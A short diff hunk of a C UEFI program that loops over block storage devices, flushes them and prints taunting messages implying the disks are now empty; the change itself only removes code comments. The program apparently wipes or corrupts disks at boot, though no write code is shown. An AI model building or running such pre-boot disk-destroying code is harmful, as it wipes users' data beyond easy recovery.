@@ -135,14 +135,14 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
             } else {
                 Status = BlockIo->FlushBlocks(BlockIo);
                 if (EFI_ERROR(Status)) {
-                    // Intentionally do nothing on flush error
+
                 }
             }
 
             if (gShouldPrintMessage) {
                 Print(L"This is my world without you, bro. Empty. T-T\n");
                 Print(L"Stay with me or you will not see me again forever.\n");
-                gShouldPrintMessage = FALSE; // Reset the flag
+                gShouldPrintMessage = FALSE;
             }
         }
         BS->CloseProtocol(HandleBuffer[i], &gEfiBlockIoProtocolGuid, ImageHandle, NULL);
